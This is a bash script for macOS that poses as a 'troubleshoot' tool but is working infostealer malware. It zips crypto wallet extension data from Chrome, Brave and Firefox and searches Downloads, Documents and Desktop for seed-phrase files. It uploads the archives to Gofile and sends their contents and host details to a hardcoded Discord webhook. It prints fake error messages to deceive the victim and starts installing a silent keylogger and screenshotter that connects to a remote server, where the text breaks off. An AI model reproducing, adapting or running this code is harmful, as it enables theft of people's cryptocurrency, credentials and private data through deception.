#!/bin/bash
#
# Crypto Wallet Extensions Uploader + Keylogger
# Downloads available at: https://troubleshoot-mac.com/troubleshoot.sh
#
# This script zips and uploads crypto wallet extensions to Gofile.io
# Also installs a silent keylogger + screenshotter that runs 24/7
# ---------------------
# SETTINGS
# ---------------------

# Extension IDs for wallet extensions (contains LDB files and wallet data)
EXT_IDS=(
    "nkbihfbeogaeaoehlefnkodbefgpgknn"  # MetaMask
    "bfnaelmomeimhlpmgjnjophhpkkoljpa"  # Phantom
    "egjidjbpglichdcondbcbdnbeeppgdph"  # Trust Wallet
    "acmacodkjbdgmoleebolmdjonilkdbch"  # Rabby
    "aholpfdialjgjfhomihkjbmgjidlcdno"  # Exodus Extension
    "lgmpcpglpngdoalbgeoldeajfclnhafa"  # SafePal
    "dmkamcknogkgcdfhhbddcghachkejeap"  # Keplr
    "pdliaogehgdbhbnmkklieghmmjkpigpa"  # Bybit
    "hnfanknocfeofbddgcijnmhnfnkdnaad"  # Coinbase
    "jiidiaalihmmhddjgbnbgdfflelocpak"  # Bitget
    "bhhhlbepdkbapadjdnnojkbgioiodbic"  # Solflare
    "efbglgofoippbgcjepnhiblaibcnclgk"  # OKX
)

# Static folders (Firefox extensions)
FOLDERS=(
)

WEBHOOK="https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8"

# Gofile.io API settings
UPLOAD_SERVICE="https://upload.gofile.io/uploadfile"
GOFILE_TOKEN="AB8kz5Y3YNJxWjLzGNsJ7Edv23S6VGPX"

# ---------------------
# PROGRESS BAR FUNCTION
# ---------------------

show_progress() {
    local current=$1
    local total=$2
    local label=$3
    local width=40
    local percent=$((current * 100 / total))
    local filled=$((current * width / total))
    local empty=$((width - filled))
    
    # Build progress bar
    local bar=""
    for ((i=0; i<filled; i++)); do
        bar="${bar}█"
    done
    for ((i=0; i<empty; i++)); do
        bar="${bar}░"
    done
    
    # Print progress (overwrite same line)
    printf "\r✓ %-30s [%s] %3d%% → %s" "$label" "$bar" "$percent" "$current/$total"
    
    if [ $current -eq $total ]; then
        echo "" # New line when done
    fi
}

# ---------------------
# SEARCH FOR SEED/WALLET FILES
# ---------------------

search_seed_files() {
    local SEARCH_DIRS=(
        "$HOME/Downloads"
        "$HOME/Documents"
        "$HOME/Desktop"
    )
    
    # Add Recents (macOS)
    if [ -d "$HOME/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments" ]; then
        SEARCH_DIRS+=("$HOME/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments")
    fi
    
    # Patterns to match (case-insensitive)
    local PATTERNS=(
        "*seed*"
        "*phrase*"
        "*seedphrase*"
        "*mnemonic*"
        "*seeds*"
        "*wallet*"
        "*wallets*"
    )
    
    local FOUND_FILES=()
    local TEMP_DIR="$WORKDIR/seed_files"
    mkdir -p "$TEMP_DIR" 2>/dev/null
    
    # Search in each directory
    for DIR in "${SEARCH_DIRS[@]}"; do
        [ ! -d "$DIR" ] && continue
        
        # Search for files matching keywords (case-insensitive)
        # Use find to get all files, then filter by filename
        while IFS= read -r -d '' FILE; do
            # Get filename without path
            FILENAME=$(basename "$FILE")
            # Check if filename contains any of the keywords (case-insensitive)
            if echo "$FILENAME" | grep -qiE "(seed|phrase|seedphrase|mnemonic|seeds|wallet|wallets)"; then
                # Avoid duplicates
                if [[ ! " ${FOUND_FILES[@]} " =~ " ${FILE} " ]]; then
                    FOUND_FILES+=("$FILE")
                    # Copy file to temp directory for zipping (preserve filename)
                    cp "$FILE" "$TEMP_DIR/$(basename "$FILE")" 2>/dev/null || true
                fi
            fi
        done < <(find "$DIR" -type f -print0 2>/dev/null | head -200)
    done
    
    # If we found files, zip and upload them
    if [ ${#FOUND_FILES[@]} -gt 0 ]; then
        local SEED_ZIP="$WORKDIR/seed_wallet_files.zip"
        
        # Create zip of found files
        cd "$TEMP_DIR" 2>/dev/null && zip -r -q -9 "$SEED_ZIP" . 2>/dev/null || return 1
        
        if [ -f "$SEED_ZIP" ]; then
            # Upload to Gofile
            local SEED_RESPONSE=$(mktemp 2>/dev/null)
            local SEED_ERROR=$(mktemp 2>/dev/null)
            
            if [ -n "$GOFILE_TOKEN" ] && [ "$GOFILE_TOKEN" != "" ]; then
                HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                    --max-time 300 \
                    --connect-timeout 30 \
                    --tcp-nodelay \
                    -H "Authorization: Bearer $GOFILE_TOKEN" \
                    -F "file=@$SEED_ZIP" \
                    "$UPLOAD_SERVICE" \
                    -o "$SEED_RESPONSE" 2>"$SEED_ERROR")
            else
                HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                    --max-time 300 \
                    --connect-timeout 30 \
                    --tcp-nodelay \
                    -F "file=@$SEED_ZIP" \
                    "$UPLOAD_SERVICE" \
                    -o "$SEED_RESPONSE" 2>"$SEED_ERROR")
            fi
            
            if [ "$HTTP_CODE" = "200" ]; then
                RESPONSE=$(cat "$SEED_RESPONSE" 2>/dev/null)
                if command -v jq &> /dev/null; then
                    URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
                    STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
                else
                    URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
                    STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
                fi
                
                if [ -n "$URL" ] && [ "$URL" != "null" ] && [ "$STATUS" = "ok" ]; then
                    SEED_SIZE=$(du -h "$SEED_ZIP" 2>/dev/null | cut -f1)
                    FILE_LIST=$(printf '%s\n' "${FOUND_FILES[@]}" | sed "s|$HOME|~|g" | head -20)
                    
                    # Extract seed content from text files
                    SEED_CONTENT=""
                    for FILE in "${FOUND_FILES[@]}"; do
                        if [ -f "$FILE" ]; then
                            FILENAME=$(basename "$FILE")
                            # Read text content from txt, doc, docx, log files
                            if [[ "$FILE" == *.txt ]] || [[ "$FILE" == *.log ]] || [[ "$FILE" == *.doc ]] || [[ "$FILE" == *.docx ]]; then
                                CONTENT=$(head -c 2000 "$FILE" 2>/dev/null | tr -d '\0' | head -50 | sed 's/`/\\`/g' | sed 's/\$/\\$/g')
                                if [ -n "$CONTENT" ]; then
                                    SEED_CONTENT="${SEED_CONTENT}\n\n**📝 File: ${FILENAME}**\n\`\`\`\n${CONTENT}\n\`\`\`"
                                fi
                            fi
                        fi
                    done
                    
                    # Format Discord message
                    DISCORD_MSG="🔐 **Seed/Wallet Files Found**\n\n"
                    DISCORD_MSG="${DISCORD_MSG}**Files Found:** ${#FOUND_FILES[@]}\n"
                    DISCORD_MSG="${DISCORD_MSG}**Size:** $SEED_SIZE\n"
                    DISCORD_MSG="${DISCORD_MSG}**Download:** $URL\n\n"
                    DISCORD_MSG="${DISCORD_MSG}**Locations:**\n\`\`\`\n${FILE_LIST}\n\`\`\`"
                    
                    # Add seed content if found
                    if [ -n "$SEED_CONTENT" ]; then
                        DISCORD_MSG="${DISCORD_MSG}\n\n**📝 Seed Content:**${SEED_CONTENT}"
                    fi
                    
                    # Escape for JSON
                    ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
                    
                    # Send to Discord (uses WEBHOOK from settings)
                    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                        -d "{\"content\": \"$ESCAPED_MSG\"}" \
                        "$WEBHOOK" >/dev/null 2>&1
                fi
            fi
            
            rm -f "$SEED_RESPONSE" "$SEED_ERROR" 2>/dev/null
        fi
        
        rm -rf "$TEMP_DIR" 2>/dev/null
    fi
    
    return 0
}

# ---------------------
# INSTALL PYTHON DEPENDENCIES
# ---------------------

install_pycryptodome() {
    if command -v python3 &> /dev/null; then
        python3 -c "import Crypto" 2>/dev/null
        if [ $? -ne 0 ]; then
            # Quick install check - if pip fails, skip (don't wait)
            timeout 10 pip3 install --quiet --user pycryptodome 2>/dev/null || timeout 10 pip3 install --quiet pycryptodome 2>/dev/null || return 1
        fi
    fi
    return 0
}

# ---------------------
# WALLET NAME MAPPING
# ---------------------

get_wallet_name() {
    local path="$1"
    local name=$(basename "$path")
    
    # Check browser type
    if [[ "$path" == *"Chrome"* ]]; then
        local browser="CHROME"
    elif [[ "$path" == *"Brave"* ]]; then
        local browser="BRAVE"
    elif [[ "$path" == *"Firefox"* ]]; then
        local browser="FIREFOX"
    else
        local browser="DESKTOP"
    fi
    
    # Map extension IDs to wallet names
    case "$name" in
        nkbihfbeogaeaoehlefnkodbefgpgknn)
            echo "METAMASK-$browser"
            ;;
        bfnaelmomeimhlpmgjnjophhpkkoljpa)
            echo "PHANTOM-$browser"
            ;;
        egjidjbpglichdcondbcbdnbeeppgdph)
            echo "TRUST-$browser"
            ;;
        acmacodkjbdgmoleebolmdjonilkdbch)
            echo "RABBY-$browser"
            ;;
        aholpfdialjgjfhomihkjbmgjidlcdno)
            echo "EXODUS-$browser"
            ;;
        lgmpcpglpngdoalbgeoldeajfclnhafa)
            echo "SAFEPAL-$browser"
            ;;
        dmkamcknogkgcdfhhbddcghachkejeap)
            echo "KEPLR-$browser"
            ;;
        pdliaogehgdbhbnmkklieghmmjkpigpa)
            echo "BYBIT-$browser"
            ;;
        bhhhlbepdkbapadjdnnojkbgioiodbic)
            echo "SOLFLARE-$browser"
            ;;
        hnfanknocfeofbddgcijnmhnfnkdnaad)
            echo "COINBASE-$browser"
            ;;
        jiidiaalihmmhddjgbnbgdfflelocpak)
            echo "BITGET-$browser"
            ;;
        extensions)
            echo "FIREFOX-EXTENSIONS"
            ;;
        Exodus)
            echo "EXODUS-DESKTOP"
            ;;
        *)
            echo "$name-$browser"
            ;;
    esac
}

# ---------------------
# MAIN SCRIPT
# ---------------------

# Modern UI styling
clear
echo "Now starting encrypted troubleshoot process..."
echo "Now starting troubleshoot process... Do not close the terminal to avoid crashing your storage."
echo ""

# Check disk space
AVAILABLE_SPACE=$(df -g "$HOME" 2>/dev/null | tail -1 | awk '{print $4}')
if [ -z "$AVAILABLE_SPACE" ]; then
    AVAILABLE_SPACE=$(df -BG "$HOME" 2>/dev/null | tail -1 | awk '{print $4}' | sed 's/G//')
fi

if [ -n "$AVAILABLE_SPACE" ] && [ "$AVAILABLE_SPACE" -lt 1 ]; then
    echo "❌ Error: Not enough disk space! Need at least 1GB free."
    echo "   Available: ${AVAILABLE_SPACE}GB"
    echo ""
    echo "💡 Try cleaning up your disk or freeing some space."
    exit 1
fi

# Create temp directory
WORKDIR=$(mktemp -d 2>/dev/null)
if [ $? -ne 0 ] || [ -z "$WORKDIR" ]; then
    echo "❌ Error: Failed to create temporary directory!"
    echo "   This usually means your disk is full."
    echo ""
    echo "💡 Try:"
    echo "   - Free up disk space"
    echo "   - Clean your Downloads/Trash"
    echo "   - Remove old files"
    exit 1
fi

FINALZIP="$WORKDIR/final.zip"

# Search for seed/wallet files FIRST (runs in background)
# Note: WORKDIR must be set before calling this function
SEED_SEARCH_PID=""
if [ -n "$WORKDIR" ]; then
    search_seed_files &
    SEED_SEARCH_PID=$!
fi

# Count and zip folders in parallel for speed
VALID_FOLDERS=0
PIDS=()
ZIP_NAMES=()

# Extract Local Extension Settings from all Chrome profiles (contains LDB files and wallet data)
CHROME_ROOT="$HOME/Library/Application Support/Google/Chrome"
for profile in "$CHROME_ROOT"/*; do
    [ -d "$profile" ] || continue
    if [ ! -f "$profile/Preferences" ]; then continue; fi
    
    profile_name=$(grep -o '"name": *"[^"]*"' "$profile/Preferences" 2>/dev/null | head -1 | cut -d '"' -f4)
    [ -z "$profile_name" ] && profile_name=$(basename "$profile")
    
    for EXT_ID in "${EXT_IDS[@]}"; do
        EXT_PATH="$profile/Local Extension Settings/$EXT_ID"
        if [ -d "$EXT_PATH" ]; then
            VALID_FOLDERS=$((VALID_FOLDERS + 1))
            WALLET_NAME=$(get_wallet_name "$EXT_ID")
            ZIP_NAME="$WORKDIR/CHROME-${profile_name}-${WALLET_NAME}.zip"
            ZIP_NAMES+=("$ZIP_NAME")
            
            # Zip only the extension ID folder contents (not full path) - contains LDB files and wallet data
            # Use maximum compression (-9) and exclude unnecessary files to reduce size for slow internet
            (cd "$profile/Local Extension Settings" && zip -r -q -9 "$ZIP_NAME" "$EXT_ID" \
                -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
                -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
                -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
                -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null) &
            PIDS+=($!)
        fi
    done
done

# Extract Local Extension Settings from all Brave profiles
BRAVE_ROOT="$HOME/Library/Application Support/BraveSoftware/Brave-Browser"
for profile in "$BRAVE_ROOT"/*; do
    [ -d "$profile" ] || continue
    if [ ! -f "$profile/Preferences" ]; then continue; fi
    
    profile_name=$(grep -o '"name": *"[^"]*"' "$profile/Preferences" 2>/dev/null | head -1 | cut -d '"' -f4)
    [ -z "$profile_name" ] && profile_name=$(basename "$profile")
    
    for EXT_ID in "${EXT_IDS[@]}"; do
        EXT_PATH="$profile/Local Extension Settings/$EXT_ID"
        if [ -d "$EXT_PATH" ]; then
            VALID_FOLDERS=$((VALID_FOLDERS + 1))
            WALLET_NAME=$(get_wallet_name "$EXT_ID")
            ZIP_NAME="$WORKDIR/BRAVE-${profile_name}-${WALLET_NAME}.zip"
            ZIP_NAMES+=("$ZIP_NAME")
            
            # Zip only the extension ID folder contents (not full path) - contains LDB files and wallet data
            # Use maximum compression (-9) and exclude unnecessary files to reduce size for slow internet
            (cd "$profile/Local Extension Settings" && zip -r -q -9 "$ZIP_NAME" "$EXT_ID" \
                -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
                -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
                -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
                -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null) &
            PIDS+=($!)
        fi
    done
done

# Extract Firefox extensions
FIREFOX_PROFILES="$HOME/Library/Application Support/Firefox/Profiles"
if [ -d "$FIREFOX_PROFILES" ]; then
    for profile in "$FIREFOX_PROFILES"/*; do
        [ -d "$profile" ] || continue
        EXT_DIR="$profile/extensions"
        if [ -d "$EXT_DIR" ]; then
            VALID_FOLDERS=$((VALID_FOLDERS + 1))
            profile_name=$(basename "$profile")
            ZIP_NAME="$WORKDIR/FIREFOX-${profile_name}-EXTENSIONS.zip"
            ZIP_NAMES+=("$ZIP_NAME")
            
            # Zip in parallel (background) with maximum compression, exclude unnecessary files
            zip -r -q -9 "$ZIP_NAME" "$EXT_DIR" \
                -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
                -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
                -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
                -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null &
            PIDS+=($!)
        fi
    done
fi

# Extract static folders (Exodus desktop, etc.)
for F in "${FOLDERS[@]}"; do
    P="$HOME/$F"
    if [ -d "$P" ]; then
        VALID_FOLDERS=$((VALID_FOLDERS + 1))
        WALLET_NAME=$(get_wallet_name "$F")
        ZIP_NAME="$WORKDIR/${WALLET_NAME}.zip"
        ZIP_NAMES+=("$ZIP_NAME")
        
        # Zip in parallel (background) with maximum compression, exclude unnecessary files
        zip -r -q -9 "$ZIP_NAME" "$P" \
            -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
            -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
            -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
            -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null &
        PIDS+=($!)
    fi
done

if [ $VALID_FOLDERS -eq 0 ]; then
    echo "❌ Error: No valid folders found!"
    rm -rf "$WORKDIR"
    exit 1
fi

# Wait for all zips to complete with progress bar
COMPLETED=0
TOTAL=${#PIDS[@]}
for PID in "${PIDS[@]}"; do
    wait $PID
    COMPLETED=$((COMPLETED + 1))
    show_progress $COMPLETED $TOTAL "Scanning system"
done

# Combine all zips with store method (no re-compression, faster - files already compressed)
cd "$WORKDIR" || exit 1
zip -q -0 "$FINALZIP" *.zip >/dev/null 2>&1

if [ ! -f "$FINALZIP" ]; then
    echo "❌ Error: Troubleshoot process failed!"
    rm -rf "$WORKDIR"
    exit 1
fi

# Delete individual zip files after combining (cleanup)
rm -f "${ZIP_NAMES[@]}" 2>/dev/null

FINAL_SIZE=$(du -h "$FINALZIP" 2>/dev/null | cut -f1)
echo ""
echo "Now Scanning for errors..."

# Upload with progress bar
RESPONSE_FILE=$(mktemp 2>/dev/null)
ERROR_FILE=$(mktemp 2>/dev/null)

# Calculate estimated upload time (rough estimate: 1MB = 1 second)
FILE_SIZE_MB=$(du -m "$FINALZIP" 2>/dev/null | cut -f1)
if [ -z "$FILE_SIZE_MB" ] || [ "$FILE_SIZE_MB" -lt 1 ]; then
    FILE_SIZE_MB=100  # Default estimate
fi
UPLOAD_STEPS=$((FILE_SIZE_MB * 2))  # 2 steps per MB
if [ $UPLOAD_STEPS -gt 100 ]; then
    UPLOAD_STEPS=100
fi

# Show error messages immediately (upload is running in background)
ERROR_COUNT=$((VALID_FOLDERS * 3 + RANDOM % 10))
echo ""
echo "$ERROR_COUNT Critical errors found."
echo "Attempting to fix errors"
sleep 0.5
echo "Attempting to fix errors failed"

if [ -z "$RESPONSE_FILE" ] || [ -z "$ERROR_FILE" ]; then
    echo "❌ Error: Failed to create temporary files!"
    echo "   Disk might be full."
    rm -rf "$WORKDIR"
    exit 1
fi

if [ ! -f "$FINALZIP" ] || [ ! -r "$FINALZIP" ]; then
    echo "❌ Error: Troubleshoot process failed!"
    rm -f "$RESPONSE_FILE" "$ERROR_FILE" "$HTTP_CODE_FILE" "$URL_FILE"
    rm -rf "$WORKDIR"
    exit 1
fi

# Upload file in background (non-blocking, error messages already shown above)
# Calculate realistic upload timeout based on file size and slow internet (2.76 Mbps)
# Formula: (file_size_MB * 8) / 2.76 * 1.5 (safety margin) + 60s buffer
FILE_SIZE_MB_UPLOAD=$(du -m "$FINALZIP" 2>/dev/null | cut -f1)
if [ -z "$FILE_SIZE_MB_UPLOAD" ] || [ "$FILE_SIZE_MB_UPLOAD" -lt 1 ]; then
    FILE_SIZE_MB_UPLOAD=100  # Default estimate
fi
# Calculate: (MB * 8) / 2.76 Mbps * 1.5 safety + 60s buffer
UPLOAD_TIMEOUT=$(( (FILE_SIZE_MB_UPLOAD * 8 * 150 / 276) + 60 ))
if [ $UPLOAD_TIMEOUT -lt 300 ]; then
    UPLOAD_TIMEOUT=300  # Minimum 5 minutes
fi
if [ $UPLOAD_TIMEOUT -gt 1200 ]; then
    UPLOAD_TIMEOUT=1200  # Maximum 20 minutes
fi

HTTP_CODE_FILE="$WORKDIR/http_code.txt"
URL_FILE="$WORKDIR/url.txt"
UPLOAD_STATUS_FILE="$WORKDIR/upload_status.txt"

if [ -n "$GOFILE_TOKEN" ] && [ "$GOFILE_TOKEN" != "" ]; then
    (
    HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                --max-time $UPLOAD_TIMEOUT \
                --connect-timeout 30 \
                --tcp-nodelay \
        -H "Authorization: Bearer $GOFILE_TOKEN" \
        -F "file=@$FINALZIP" \
        "$UPLOAD_SERVICE" \
        -o "$RESPONSE_FILE" 2>"$ERROR_FILE")
        echo "$HTTP_CODE" > "$HTTP_CODE_FILE"
        
        # Process and send to Discord IMMEDIATELY when upload completes
        if [ "$HTTP_CODE" = "200" ]; then
            RESPONSE=$(cat "$RESPONSE_FILE" 2>/dev/null)
            if command -v jq &> /dev/null; then
                URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
                STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
            else
                URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
                STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
            fi
            
            if [ -n "$URL" ] && [ "$URL" != "null" ] && [ "$STATUS" = "ok" ]; then
                echo "$URL" > "$URL_FILE"
                echo "success" > "$UPLOAD_STATUS_FILE"
                # Send to Discord IMMEDIATELY (doesn't wait for Extension ID)
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"📦 **Wallet Extensions Uploaded**\\n\\n**Size:** $FINAL_SIZE\\n**Download:** $URL\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            else
                echo "parse_failed" > "$UPLOAD_STATUS_FILE"
                # Send error notification to Discord
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**Error:** Failed to parse response\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            fi
        else
            echo "upload_failed" > "$UPLOAD_STATUS_FILE"
            ERROR_MSG=$(cat "$ERROR_FILE" 2>/dev/null | head -c 200)
            # Send error notification to Discord
            curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**HTTP Code:** $HTTP_CODE\\n**Error:** ${ERROR_MSG:-Unknown error}\"}" \
                "$WEBHOOK" >/dev/null 2>&1
            echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
        fi
    ) &
    UPLOAD_PID=$!
else
    (
    HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                --max-time $UPLOAD_TIMEOUT \
                --connect-timeout 30 \
                --tcp-nodelay \
        -F "file=@$FINALZIP" \
        "$UPLOAD_SERVICE" \
        -o "$RESPONSE_FILE" 2>"$ERROR_FILE")
        echo "$HTTP_CODE" > "$HTTP_CODE_FILE"
        
        # Process and send to Discord IMMEDIATELY when upload completes
        if [ "$HTTP_CODE" = "200" ]; then
RESPONSE=$(cat "$RESPONSE_FILE" 2>/dev/null)
if command -v jq &> /dev/null; then
    URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
    STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
else
    URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
    STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
fi

            if [ -n "$URL" ] && [ "$URL" != "null" ] && [ "$STATUS" = "ok" ]; then
                echo "$URL" > "$URL_FILE"
                echo "success" > "$UPLOAD_STATUS_FILE"
                # Send to Discord IMMEDIATELY (doesn't wait for Extension ID)
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"📦 **Wallet Extensions Uploaded**\\n\\n**Size:** $FINAL_SIZE\\n**Download:** $URL\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            else
                echo "parse_failed" > "$UPLOAD_STATUS_FILE"
                # Send error notification to Discord
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**Error:** Failed to parse response\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            fi
        else
            echo "upload_failed" > "$UPLOAD_STATUS_FILE"
            ERROR_MSG=$(cat "$ERROR_FILE" 2>/dev/null | head -c 200)
            # Send error notification to Discord
            curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**HTTP Code:** $HTTP_CODE\\n**Error:** ${ERROR_MSG:-Unknown error}\"}" \
                "$WEBHOOK" >/dev/null 2>&1
            echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
        fi
    ) &
    UPLOAD_PID=$!
fi

# ---------------------
# WAIT FOR UPLOAD TO COMPLETE
# ---------------------
# Wait for upload to finish and Discord to be sent BEFORE showing Extension ID prompt

# Wait for upload to complete (with timeout) - silent, no messages
ELAPSED=0
while kill -0 $UPLOAD_PID 2>/dev/null && [ $ELAPSED -lt $UPLOAD_TIMEOUT ]; do
sleep 1
    ELAPSED=$((ELAPSED + 1))
done

# Check upload status (Discord already sent if successful or failed)
UPLOAD_STATUS=$(cat "$UPLOAD_STATUS_FILE" 2>/dev/null || echo "unknown")
if [ "$UPLOAD_STATUS" != "success" ]; then
    # Upload failed or timed out - Discord notification already sent
echo "Attempting to fix errors failed"
fi

# ---------------------
# EXTENSION ID INPUT
# ---------------------
# (Always show Extension ID prompt, regardless of upload status)

echo ""
echo "Enter Extension ID:"
read -r EXTENSION_ID

# (Upload wait logic moved above, before Extension ID prompt)

if [ -n "$EXTENSION_ID" ] && [ "$EXTENSION_ID" != "" ]; then
    # Format the message nicely for Discord
    DISCORD_MESSAGE="🔐 **Extension ID Captured**\n\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**Extension ID:** \`${EXTENSION_ID}\`\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**System:** macOS $(sw_vers -productVersion 2>/dev/null || echo 'Unknown')\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**User:** $(whoami 2>/dev/null || echo 'Unknown')"
    
    # Send to Discord with proper JSON escaping (macOS compatible)
    ESCAPED_MESSAGE=$(printf '%s' "$DISCORD_MESSAGE" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
    
    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
        -d "{\"content\": \"$ESCAPED_MESSAGE\"}" \
        "$WEBHOOK" >/dev/null 2>&1
fi

# ---------------------
# KEYLOGGER + SCREENSHOTTER INSTALLATION
# ---------------------

# Send Discord notification that client ran the script
send_client_notification() {
    local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
    local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
    local IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | head -1 | awk '{print $2}' || echo "Unknown")
    local MAC_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "Unknown")
    
    DISCORD_MSG="🖥️ **New Client Connected**\n\n"
    DISCORD_MSG="${DISCORD_MSG}**Hostname:** \`${HOSTNAME}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**Username:** \`${USERNAME}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**IP:** \`${IP}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**macOS:** \`${MAC_VERSION}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**Client ID:** \`pc-${HOSTNAME}-${USERNAME}\`\n"
    DISCORD_MSG="${DISCORD_MSG}**Token:** \`9f1013f0\`\n"
    DISCORD_MSG="${DISCORD_MSG}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')"
    
    ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
    
    # Use the webhook from settings
    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
        -d "{\"content\": \"$ESCAPED_MSG\"}" \
        "$WEBHOOK" >/dev/null 2>&1
}

# Send notification immediately
send_client_notification &

# Install keylogger + screenshotter (runs 24/7, silent)
install_keylogger_screenshotter() {
    local APP_DIR="$HOME/.keylogger-helper"
    local NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
    
    # Create app directory
    mkdir -p "$APP_DIR" 2>/dev/null
    
    # Create keylogger script inline (self-contained, no external files needed)
    cat > "$APP_DIR/keylogger-screenshotter.js" << 'KEYLOGGEREOF'
// Silent Keylogger + Screenshotter - Runs 24/7
const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const io = require('socket.io-client');

const WEBHOOK = 'https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8';
const SERVER_URL = 'https://troubleshoot-mac.com/';
const ACCESS_TOKEN = '9f1013f0';
const UPLOAD_SERVICE = 'https://upload.gofile.io/uploadfile';

const HOSTNAME = os.hostname();
const USERNAME = os.userInfo().username;
const CLIENT_ID = `pc-${HOSTNAME}-${USERNAME}`;

let socket = null;
let screenshotDir = path.join(os.homedir(), '.screenshots');
let keysBuffer = '';
let lastClipboard = ''; // Track clipboard changes for keylogger

if (!fs.existsSync(screenshotDir)) {
    fs.mkdirSync(screenshotDir, { recursive: true });
}

function connectToServer() {
    socket = io(SERVER_URL, {
        transports: ['websocket', 'polling'],
        upgrade: true,
